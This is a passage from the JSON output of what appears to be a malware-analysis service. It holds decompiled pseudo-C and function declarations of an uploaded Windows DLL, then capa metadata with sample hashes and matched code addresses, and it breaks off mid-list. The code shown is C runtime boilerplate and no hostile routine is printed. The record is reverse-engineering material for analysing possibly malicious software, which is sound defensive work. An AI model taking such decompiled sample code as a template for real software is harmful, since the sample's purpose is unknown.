    "__int64 __fastcall amsg_exit(__int64 a1)",
    "{",
    "}__int64 __fastcall sub_62749900(__int64 a1, __int64 a2)",
    "{",
    "  char *v4; // rax",
    "  char *v5; // rdx",
    "  __int64 v7; // rsi",
    "  char *v8; // rax",
    "  char *v9; // rdx",
    "  char *v10; // rdx",
    "",
    "  if ( !a1 )",
    "    return 0xFFFFFFFFLL;",
    "  lock(8);",
    "  if ( *(_QWORD *)a1 )",
    "  {",
    "    v4 = *(char **)(a1 + 8);",
    "    v5 = *(char **)(a1 + 16);",
    "LABEL_4:",
    "    if ( v5 != v4 )",
    "    {",
    "LABEL_5:",
    "      *(_QWORD *)(a1 + 8) = v4 + 8;",
    "      *(_QWORD *)v4 = a2;",
    "      unlock(8, v4 + 8);",
    "      return 0;",
    "    }",
    "    v7 = (__int64)&v4[-*(_QWORD *)a1];",
    "    v8 = (char *)realloc(*(void **)a1, 16 * (v7 >> 3));",
    "    v9 = v8;",
    "    if ( v8 )",
    "    {",
    "      v10 = &v8[16 * (v7 >> 3)];",
    "      *(_QWORD *)a1 = v8;",
    "      v4 = &v8[v7];",
    "      *(_QWORD *)(a1 + 16) = v10;",
    "      goto LABEL_5;",
    "    }",
    "    goto LABEL_11;",
    "  }",
    "  v4 = (char *)calloc(0x20u, 8u);",
    "  *(_QWORD *)a1 = v4;",
    "  if ( v4 )",
    "  {",
    "    v5 = v4 + 256;",
    "    *(_QWORD *)(a1 + 8) = v4;",
    "    *(_QWORD *)(a1 + 16) = v4 + 256;",
    "    goto LABEL_4;",
    "  }",
    "LABEL_11:",
    "  unlock(8, v9);",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627499E0(__int64 a1)",
    "{",
    "  void (**v2)(void); // r12",
    "  void (**v3)(void); // rbx",
    "  __int64 v4; // rdx",
    "",
    "  lock(8);",
    "  v2 = *(void (***)(void))a1;",
    "  v3 = *(void (***)(void))(a1 + 8);",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  *(_QWORD *)a1 = 0;",
    "  unlock(8, v4);",
    "  if ( v2 )",
    "  {",
    "    while ( v2 <= --v3 )",
    "    {",
    "      while ( *v3 )",
    "      {",
    "        (*v3--)();",
    "        if ( v2 > v3 )",
    "          goto LABEL_5;",
    "      }",
    "    }",
    "LABEL_5:",
    "    free(v2);",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "FILE *__fastcall sub_62749A60(int a1)",
    "{",
    "  return &_iob_func()[a1];",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void *__cdecl realloc(void *Block, size_t Size)",
    "{",
    "}// attributes: thunk",
    "__int64 __fastcall unlock(__int64 a1, __int64 a2)",
    "{",
    "}// attributes: thunk",
    "__int64 __fastcall lock(__int64 a1)",
    "{",
    "}// attributes: thunk",
    "FILE *__cdecl _iob_func()",
    "{",
    "}"
  ],
  "h_code": [
    "#include <windows.h>",
    "#include <stdint.h>",
    "#include <stdio.h>",
    "",
    "#include \"defs.h\"",
    "",
    "void JUMPOUT(int a) {",
    "}",
    "",
    "unsigned int _bss_start__ = 0;",
    "unsigned int __cxa_finalize = 0;",
    "__int64 __fastcall sub_62741010(__int64 a1, int a2, __int64 a3);",
    "__int64 __fastcall sub_62741200(void *a1, unsigned int a2, __int64 a3);",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);",
    "__int64 __fastcall StartAddress(HMODULE lpThreadParameter);",
    "void sub_627413F0();",
    "__int64 __fastcall sub_62741420(LPVOID lpParameter, int a2);",
    "HRESULT __stdcall DllRegisterServer();",
    "__int64 DllRegisterServerEx();",
    "HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv);",
    "HRESULT __stdcall DllUnregisterServer();",
    "void Start();",
    "_BYTE *__fastcall sub_62741530(_BYTE *a1, _BYTE *a2, int a3);",
    "_BYTE *__fastcall sub_62741690(_BYTE *a1, _BYTE *a2, int a3);",
    "int sub_627417F0(wchar_t *a1, size_t a2, const wchar_t *a3, ...);",
    "__int64 __fastcall sub_62741810(__int64 a1);",
    "__int64 sub_62741A50();",
    "__int64 sub_62741B10();",
    "__int64 sub_62741B60();",
    "__int64 sub_62741CD0();",
    "__int64 sub_62741D50();",
    "__int64 __fastcall sub_62741DE0(HMODULE hModule);",
    "char *__fastcall sub_62741F30(",
    "        __int64 a1,",
    "        __int64 a2,",
    "        unsigned __int16 a3,",
    "        int a4,",
    "        __int64 a5,",
    "        HKEY *String,",
    "        __int64 a7,",
    "        int a8,",
    "        _DWORD *a9,",
    "        int a10);",
    "int sub_62742580(wchar_t *a1, size_t a2, const wchar_t *a3, ...);",
    "CHAR *__fastcall sub_627425A0(LPCWCH lpWideCharStr);",
    "WCHAR *__fastcall sub_62742640(const CHAR *lpMultiByteStr);",
    "CHAR *__fastcall sub_627426C0(LPCWCH lpWideCharStr);",
    "WCHAR *__fastcall sub_62742760(const CHAR *lpMultiByteStr);",
    "_BYTE *__fastcall sub_62742820(__int64 a1);",
    "WCHAR *__fastcall sub_627428E0(_BYTE *a1, unsigned int a2);",
    "CHAR *__fastcall sub_62742960(",
    "        _DWORD *a1,",
    "        _DWORD *a2,",
    "        const WCHAR *a3,",
    "        const WCHAR *a4,",
    "        const WCHAR *lpWideCharStr,",
    "        const WCHAR *a6,",
    "        const WCHAR *a7,",
    "        const char *a8,",
    "        int a9,",
    "        unsigned int *a10);",
    "int __fastcall sub_62742C40(char *Destination);",
    "_DWORD *__fastcall sub_62742CD0(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5);",
    "_DWORD *__fastcall sub_62743070(_DWORD *a1, int a2, const char *a3, int a4, ULONG *a5);",
    "char *__fastcall sub_627431B0(_DWORD *a1);",
    "char *__fastcall sub_62743670(_DWORD *a1, int a2, const char *a3, int a4, _DWORD *a5);",
    "__int64 __fastcall sub_627437A0(__int64 a1, const void *a2, DWORD a3);",
    "_DWORD *__fastcall sub_62743890(",
    "        _DWORD *a1,",
    "        int a2,",
    "        __int64 a3,",
    "        const void *a4,",
    "        DWORD a5,",
    "        const char *a6,",
    "        int a7,",
    "        unsigned int *a8);",
    "void *__fastcall sub_627439E0(__int64 a1, DWORD *a2);",
    "_DWORD *__fastcall sub_62743B20(_DWORD *a1, int a2, __int64 a3, const char *a4, int a5, unsigned int *a6);",
    "__int64 sub_62743D10();",
    "WCHAR *__fastcall sub_62743EA0(_DWORD *a1, int a2, const CHAR *a3, const char *a4, int a5, _DWORD *a6);",
    "char *__fastcall sub_627444A0(",
    "        _DWORD *a1,",
    "        int a2,",
    "        int a3,",
    "        int a4,",
    "        __int64 a5,",
    "        __int64 a6,",
    "        __int64 a7,",
    "        int a8,",
    "        const char *a9,",
    "        int a10,",
    "        unsigned int *a11);",
    "__int64 __fastcall sub_62744620(HMODULE hModule, __int64 a2, int a3);",
    "__int64 __fastcall sub_62744900(int a1, int a2);",
    "__int64 sub_62744940();",
    "__int64 sub_62744A30();",
    "__int64 __fastcall sub_62744B50(__int64 a1, const wchar_t *a2);",
    "__int64 sub_62745590();",
    "__int64 sub_627455E0();",
    "__int64 __fastcall sub_627458E0(HMODULE a1);",
    "__int64 __fastcall sub_62745A70(HMODULE a1, const wchar_t *a2);",
    "__int64 __fastcall sub_62745AC0(HMODULE a1);",
    "LPVOID __fastcall sub_62745B80(SIZE_T dwBytes);",
    "LPVOID __fastcall sub_62745BB0(LPVOID lpMem, SIZE_T dwBytes);",
    "BOOL __fastcall sub_62745BE0(LPVOID lpMem);",
    "_BOOL8 __fastcall sub_62745C10(_DWORD *a1);",
    "__int64 __fastcall sub_62745FF0(_BYTE *a1, __int64 a2, unsigned __int64 a3);",
    "char __fastcall sub_62746060(unsigned __int8 *a1, __int64 a2, __int64 a3, __int64 a4);",
    "void *__fastcall sub_627460D0(unsigned int *a1);",
    "_DWORD *__fastcall sub_62746B10(unsigned int *a1);",
    "_DWORD *__fastcall sub_62746BA0(unsigned int *a1);",
    "BOOL __fastcall sub_62746C30(__int64 a1);",
    "int sub_62746C70(wchar_t *a1, size_t a2, const wchar_t *a3, ...);",
    "WCHAR *__fastcall sub_62746C90(LPCCH lpMultiByteStr);",
    "__int64 __fastcall sub_62746D10(const WCHAR *a1, const void *a2, DWORD a3);",
    "__int64 __fastcall sub_62746DC0(int a1, const void *a2, DWORD a3, __int64 a4, const CHAR *a5, const CHAR *a6);",
    "void sub_62747270();",
    "__int64 __fastcall sub_62747580(__int64 a1, int a2);",
    "__int64 __fastcall sub_627475F0(_QWORD *a1);",
    "__int64 __fastcall sub_627477A0(HKEY *String);",
    "__int64 __fastcall sub_62747840(__int64 a1, __int64 a2, __int64 a3, int a4, unsigned int a5);",
    "__int64 __fastcall sub_62747BA0(__int64 a1);",
    "_BOOL8 __fastcall sub_62747CC0(OLECHAR *psz);",
    "__int64 sub_62747EE0();",
    "_BOOL8 sub_62748210();",
    "__int64 __fastcall sub_62748230(HKEY *String2);",
    "__int64 sub_627483E0();",
    "__int64 __fastcall sub_62748410(__int64 a1);",
    "void (*sub_62748420())(void);",
    "void sub_62748460();",
    "void sub_627484D0();",
    "LONGLONG sub_627484F0();",
    "void __fastcall  sub_627485D0(DWORD64 a1);",
    "__int64 __fastcall TlsCallback_1(__int64 a1, int a2);",
    "__int64 __fastcall TlsCallback_0(__int64 a1, int a2);",
    "void  sub_627487A0(char *Format, ...);",
    "int __fastcall sub_62748810(_QWORD *a1, char *a2, unsigned int a3);",
    "void sub_62748A20();",
    "__int64 __fastcall sub_62748D10(unsigned int *a1);",
    "__int64 sub_62748ED0();",
    "__int64 __fastcall sub_62748FD0(unsigned int **a1);",
    "void sub_62749180();",
    "__int64 __fastcall sub_627491F0(int a1, __int64 a2);",
    "__int64 __fastcall sub_62749270(int a1);",
    "__int64 __fastcall sub_62749300(__int64 a1, unsigned int a2);",
    "const char *__fastcall sub_62749470(char *Str2);",
    "__int64 __fastcall sub_62749510(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_627495A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_627495D0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_62749640(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_62749670(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_62749700(unsigned int a1, __int64 a2);",
    "void sub_627497C0();",
    "void *__fastcall sub_627497D0();",
    "__int64 sub_62749810();",
    "// attributes: thunk",
    "int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount);",
    "// attributes: thunk",
    "size_t __cdecl wcslen(const wchar_t *String);",
    "// attributes: thunk",
    "wchar_t *__cdecl wcscpy(wchar_t *Destination, const wchar_t *Source);",
    "// attributes: thunk",
    "int __cdecl wcscmp(const wchar_t *String1, const wchar_t *String2);",
    "// attributes: thunk",
    "wchar_t *__cdecl wcscat(wchar_t *Destination, const wchar_t *Source);",
    "// attributes: thunk",
    "int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList);",
    "// attributes: thunk",
    "int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);",
    "// attributes: thunk",
    "size_t __cdecl strlen(const char *Str);",
    "// attributes: thunk",
    "char *__cdecl strcpy(char *Destination, const char *Source);",
    "// attributes: thunk",
    "char *__cdecl strcat(char *Destination, const char *Source);",
    "// attributes: thunk",
    "void __cdecl srand(unsigned int Seed);",
    "// attributes: thunk",
    "_crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function);",
    "// attributes: thunk",
    "int __cdecl rand();",
    "// attributes: thunk",
    "void *__cdecl memset(void *a1, int Val, size_t Size);",
    "// attributes: thunk",
    "void *__cdecl memcpy(void *a1, const void *Src, size_t Size);",
    "// attributes: thunk",
    "size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);",
    "// attributes: thunk",
    "void __cdecl free(void *Block);",
    "// attributes: thunk",
    "void *__cdecl calloc(size_t Count, size_t Size);",
    "// attributes: thunk",
    "void __cdecl  abort();",
    "// attributes: thunk",
    "void __cdecl initterm(_PVFV *First, _PVFV *Last);",
    "// attributes: thunk",
    "__int64 __fastcall amsg_exit(__int64 a1);",
    "__int64 __fastcall sub_62749900(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_627499E0(__int64 a1);",
    "FILE *__fastcall sub_62749A60(int a1);",
    "// attributes: thunk",
    "void *__cdecl realloc(void *Block, size_t Size);",
    "// attributes: thunk",
    "__int64 __fastcall unlock(__int64 a1, __int64 a2);",
    "// attributes: thunk",
    "__int64 __fastcall lock(__int64 a1);",
    "// attributes: thunk",
    "FILE *__cdecl _iob_func();"
  ],
  "summary": [],
  "yara_rules": "",
  "capa_rules": {
    "meta": {
      "timestamp": "2025-07-14T02:16:44.972899",
      "version": "9.2.1",
      "argv": [
        "-r",
        "D:\\Whitehat\\web\\YARRAI_Web\\backend\\services\\CAPA\\capa-rules",
        "-s",
        "D:\\Whitehat\\web\\YARRAI_Web\\backend\\services\\CAPA\\capa-sigs",
        "--json",
        "D:\\Whitehat\\web\\YARRAI_Web\\backend\\uploads\\85c4eb75-76e2-42dc-a702-08cf0f79340a.exe"
      ],
      "sample": {
        "md5": "8b9178700e6738aeb688a3f6ae28f02e",
        "sha1": "ea6eb41d6f0cc4bd7bd5349d3009d21a4afc3df1",
        "sha256": "d3b437ebe0504f8ff71d2025faabf84119c9aaccb38f34d4130f7c633ce4b37f",
        "path": "D:/Whitehat/web/YARRAI_Web/backend/uploads/85c4eb75-76e2-42dc-a702-08cf0f79340a.exe"
      },
      "flavor": "static",
      "analysis": {
        "format": "pe",
        "arch": "amd64",
        "os": "windows",
        "extractor": "VivisectFeatureExtractor",
        "rules": [
          "D:/Whitehat/web/YARRAI_Web/backend/services/CAPA/capa-rules"
        ],
        "base_address": {
          "type": "absolute",
          "value": 1651769344
        },
        "layout": {
          "functions": [
            {
              "address": {
                "type": "absolute",
                "value": 1651773456
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651773528
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651773551
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651773584
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651773657
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651773741
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651773754
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651773784
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651773904
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651773952
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774052
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774252
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774288
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774052
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774252
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774288
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774310
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774320
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774368
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651808587
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651808636
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774384
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651808587
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651808636
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774416
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774416
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774448
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774448
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774472
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774488
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774496
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774496
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774505
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774520
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774569
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774592
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774592
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774624
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774624
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774656
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774656
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774688
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774688
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774720
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774720
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774736
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774736
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651774768
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774808
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774933
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651774974
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651775120
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651775160
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651775285
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651775326
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651775416
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651775472
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651775472
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651775504
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651775504
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651775712
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651775817
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651776080
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776080
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776135
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776144
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651776272
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776338
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651776352
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776352
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776433
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776512
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776582
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776621
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651776720
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776827
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651776848
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776932
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776960
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651776992
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651776992
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651777061
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651777084
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651777112
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651777136
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651777168
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651777328
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651777328
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651777528
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651777681
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651777841
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651778056
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651778086
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651778156
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651778944
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651778944
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651778976
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779125
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651779136
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779253
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651779264
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779413
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651779424
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779541
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651779552
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779588
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651779616
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779688
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779716
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779757
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651779808
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779847
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651779924
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651779936
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651780104
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651780556
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651780672
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651780704
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651780757
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651780816
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651780816
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651781049
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651781271
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651781368
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651781454
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651781744
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651781825
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651781952
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651782064
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651782064
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651782304
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651782384
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651782624
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651783280
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651783361
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651783488
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651783584
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651783644
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651783802
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651783824
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651783883
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651783934
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784042
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651784160
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784211
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784277
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784341
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651784480
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784563
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784600
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784712
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784777
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784800
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651784976
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651784976
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785013
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785032
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785076
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785217
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785304
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785336
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651785376
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785705
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785912
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651785936
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651786051
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651786437
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651786622
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651786770
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651786912
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651786912
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651786943
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651787027
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651787076
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651787182
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651787296
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651787556
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651788032
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651788032
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 1651788096
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651788223
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651788240
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651788259
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651788280
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 1651788315
                  }
                }
              ]
            },
            {
